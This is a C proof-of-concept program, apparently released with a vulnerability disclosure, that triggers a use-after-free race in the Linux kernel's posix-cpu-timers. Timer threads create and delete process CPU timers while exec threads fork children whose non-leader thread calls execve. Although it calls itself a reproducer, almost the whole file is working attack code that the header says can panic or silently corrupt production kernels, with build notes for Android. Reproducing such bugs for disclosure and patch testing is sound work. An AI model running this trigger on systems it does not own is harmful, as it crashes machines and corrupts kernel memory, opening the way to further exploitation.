// SPDX-License-Identifier: MIT
//
// CVE-2026-64560 - Race trigger / reproducer (NOT an exploit)
//
// Linux kernel posix-cpu-timers UAF caused by non-leader exec() racing
// sys_timer_delete() on an armed CLOCK_PROCESS_CPUTIME_ID timer.
//
// Trigger strategy:
//   Thread A: loop { timer_create(CLOCK_PROCESS_CPUTIME_ID); arm; burn CPU;
//                    timer_delete(); }
//   Thread B: loop { fork(); child: spawn NON-LEADER thread which calls
//                    execve("/bin/true"); parent: waitpid(); }
//
// The TGID-targeted timer is armed and enqueued on p->signal->cpu_timers.
// If posix_cpu_timer_del() hits the window where pid_task() returns the
// old leader whose sighand was just NULLed by de_thread()->__exit_signal(),
// the k_itimer is freed while still enqueued -> UAF in
// run_posix_cpu_timers() / timerqueue operations.
//
// On a KASAN kernel this produces:
//   BUG: KASAN: use-after-free in run_posix_cpu_timers / timerqueue_del ...
// On a production kernel: sporadic WARNING / panic / silent corruption.
//
// Build (Linux):  gcc -O2 -pthread -o cve_2026_64560_poc cve_2026_64560_poc.c
// Build (Android): see Makefile (NDK, aarch64, static, pie)
//
// Run only on machines you own or are authorized to test. Expect crashes.

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifdef __ANDROID__
#define EXEC_TARGET "/system/bin/true"
#else
#define EXEC_TARGET "/bin/true"
#endif

static volatile int g_stop = 0;
static long g_duration_sec = 60;

/* ------------------------------------------------------------------ */
/* Thread A: hammer process CPU timers                                 */
/* ------------------------------------------------------------------ */
static void burn_cpu_ns(long ns)
{
    struct timespec start, now;
    clock_gettime(CLOCK_THREAD_CPUTIME_ID, &start);
    do {
        /* pure busy loop: accumulate thread -> process CPU time so the
           process CPU timer can actually expire */
        for (int i = 0; i < 1000; i++)
            __asm__ volatile("" ::: "memory");
        clock_gettime(CLOCK_THREAD_CPUTIME_ID, &now);
    } while ((now.tv_sec - start.tv_sec) * 1000000000L +
             (now.tv_nsec - start.tv_nsec) < ns && !g_stop);
}

static void *timer_thread(void *arg)
{
    (void)arg;
    struct sigevent sev;
    struct itimerspec its;
    timer_t tid;
    unsigned long iter = 0;

    memset(&sev, 0, sizeof(sev));
    /* SIGEV_NONE keeps the timer queued without signal delivery churn;
       the expiry path still walks the timerqueue */
    sev.sigev_notify = SIGEV_NONE;

    while (!g_stop) {
        if (timer_create(CLOCK_PROCESS_CPUTIME_ID, &sev, &tid) != 0) {
            if (errno == EAGAIN) { usleep(1000); continue; }
            continue;
        }

        /* Arm with a very short expiry so the timer is enqueued on
           signal->cpu_timers and likely still queued at delete time. */
        its.it_interval.tv_sec = 0;
        its.it_interval.tv_nsec = 0;
        its.it_value.tv_sec = 0;
        its.it_value.tv_nsec = 50000 + (iter % 16) * 50000; /* 50us..800us */
        if (timer_settime(tid, 0, &its, NULL) != 0) {
            timer_delete(tid);
            continue;
        }

        /* Let it fire / keep the expiry path busy, but not so long that
           the timer always gets dequeued by the expiry itself. */
        burn_cpu_ns(20000 + (iter % 8) * 20000);

        /* Races with the exec thread's de_thread()/__exit_signal() */
        timer_delete(tid);
        iter++;
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* Thread B: fork() + non-leader thread execve()                       */
/* ------------------------------------------------------------------ */
static void *execer_thread(void *arg)
{
    (void)arg;
    /* We are a NON-LEADER thread: de_thread() + switch_leader() will
       move the TGID to us and reap the old leader. */
    char *argv[] = { (char *)"true", NULL };
    char *envp[] = { NULL };
    execve(EXEC_TARGET, argv, envp);
    _exit(127); /* exec failed */
}

static void do_one_exec_round(void)
{
    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        /* Child: create a non-leader thread and have IT exec(). */
        pthread_t t;
        if (pthread_create(&t, NULL, execer_thread, NULL) == 0) {
            /* Leader must stay alive until the non-leader execs.
               de_thread() kills other threads with SIGKILL anyway. */
            for (;;) pause();
        }
        _exit(127);
    }

    int status;
    while (waitpid(pid, &status, 0) < 0 && errno == EINTR)
        ;
}

static void *exec_thread(void *arg)
{
    (void)arg;
    while (!g_stop)
        do_one_exec_round();
    return NULL;
}

/* ------------------------------------------------------------------ */
/* --check mode: quick sanity smoke (does the box even have the knobs) */
/* ------------------------------------------------------------------ */
static int self_check(void)
{
    timer_t tid;
    struct sigevent sev;
    struct itimerspec its;

    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_NONE;
    if (timer_create(CLOCK_PROCESS_CPUTIME_ID, &sev, &tid) != 0) {
        printf("[-] CLOCK_PROCESS_CPUTIME_ID unavailable: %s\n", strerror(errno));
        return 1;
    }
    its.it_interval.tv_sec = 0; its.it_interval.tv_nsec = 0;
    its.it_value.tv_sec = 1;    its.it_value.tv_nsec = 0;
    if (timer_settime(tid, 0, &its, NULL) != 0) {
        printf("[-] timer_settime failed: %s\n", strerror(errno));
        timer_delete(tid);
        return 1;
    }
    timer_delete(tid);

    if (access(EXEC_TARGET, X_OK) != 0) {
        printf("[-] %s not executable\n", EXEC_TARGET);
        return 1;
    }
    {
        static char buf[256];
        FILE *f = fopen("/proc/version", "r");
        if (f) {
            if (!fgets(buf, sizeof(buf), f)) strcpy(buf, "?");
            fclose(f);
        } else {
            strcpy(buf, "?");
        }
        char *nl = strchr(buf, '\n');
        if (nl) *nl = 0;
        printf("[+] prerequisites OK (kernel %s)\n", buf);
    }
    printf("[*] now check kernel version against the fixed releases in README.md\n");
    return 0;
}

int main(int argc, char **argv)
{
    int n_timer_threads = 2;
    int n_exec_threads = 2;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--check"))
            return self_check();
        else if (!strcmp(argv[i], "-d") && i + 1 < argc)
            g_duration_sec = atol(argv[++i]);
        else if (!strcmp(argv[i], "-t") && i + 1 < argc)
            n_timer_threads = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-e") && i + 1 < argc)
            n_exec_threads = atoi(argv[++i]);
        else {
            printf("usage: %s [--check] [-d seconds] [-t timer_threads] [-e exec_threads]\n", argv[0]);
            return 1;
        }
    }

    printf("[*] CVE-2026-64560 race trigger (reproducer, not an exploit)\n");
    printf("[*] duration=%lds timer_threads=%d exec_threads=%d\n",
           g_duration_sec, n_timer_threads, n_exec_threads);
    printf("[*] watch: dmesg -wH | grep -iE 'kasan|use-after|BUG|WARNING|timer'\n");

    pthread_t th[64];
    int n = 0;
    for (int i = 0; i < n_timer_threads && n < 64; i++)
        if (pthread_create(&th[n++], NULL, timer_thread, NULL) != 0) break;
    for (int i = 0; i < n_exec_threads && n < 64; i++)
        if (pthread_create(&th[n++], NULL, exec_thread, NULL) != 0) break;

    sleep(g_duration_sec);
    g_stop = 1;

    /* Don't wait forever for fork children */
    for (int i = 0; i < n; i++) pthread_join(th[i], NULL);
    printf("[*] done. no crash observed in userspace - check dmesg/pstore.\n");
    return 0;
}
